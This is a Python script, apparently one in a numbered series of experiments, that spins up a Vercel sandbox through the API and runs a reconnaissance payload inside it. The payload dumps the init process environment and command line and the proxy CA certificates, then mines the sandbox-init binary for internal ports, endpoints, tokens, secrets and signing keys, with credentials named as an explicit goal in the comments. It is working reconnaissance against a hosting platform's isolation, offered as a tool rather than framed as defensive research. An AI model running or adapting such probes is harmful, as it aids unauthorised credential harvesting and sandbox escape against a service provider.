# 实验J28: sandbox-init 环境变量 + 二进制 strings 线索提取(普通 cmd, 快)
# J27 全盘扫超时 -> 直接读现成资源: /proc/1/environ + share 里的二进制
# 目标: 服务端口/路径/celld 配置线索/凭据
import json, base64, pathlib, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=200):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj28"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

RECON = r'''
import os, re, subprocess

print("=== [1] /proc/1/environ ===", flush=True)
try:
    env = open("/proc/1/environ","rb").read().replace(b"\x00", b"\n")
    print(env.decode(errors="replace"), flush=True)
except Exception as e:
    print("ERR", e, flush=True)

print("=== [2] /proc/1/cmdline 完整 ===", flush=True)
print(open("/proc/1/cmdline").read().replace("\x00"," "), flush=True)

print("=== [3] CA 证书 ===", flush=True)
for p in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem",
          "/usr/local/share/ca-certificates/vercel-proxy-ca.crt"]:
    try:
        d = open(p).read()
        print(p, "len", len(d))
        print(d[:1500], flush=True)
    except Exception as e:
        print(p, "ERR", e, flush=True)

print("=== [4] sandbox-init 二进制 strings(关键特征) ===", flush=True)
try:
    data = open("/run/vercel/share/sandbox-init","rb").read()
    print("binsize:", len(data), flush=True)
    strs = re.findall(rb"[\x20-\x7e]{5,}", data)
    pat = re.compile(rb"(23456|30001|30002|celld|apm|metrics|pprof|/v1/|/v2/|sandbox\.v1|spawn\.v1|/run/vercel|\.sock|:80|:443|http://|https://|token|secret|signature|pubkey|vercel\.internal|api\.vercel|localhost|127\.0\.0\.1|::1|listen|addr|port|endpoint|agent)", re.I)
    seen = set()
    out = []
    for s in strs:
        if pat.search(s):
            t = s.decode(errors="replace")
            if t not in seen:
                seen.add(t)
                out.append(t)
    print("hits:", len(out), flush=True)
    for t in out[:120]:
        print("STR:", t[:180], flush=True)
except Exception as e:
    print("ERR", type(e).__name__, e, flush=True)
'''
run_cmd(sid, RECON, "recon", wait=True, timeout=120000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
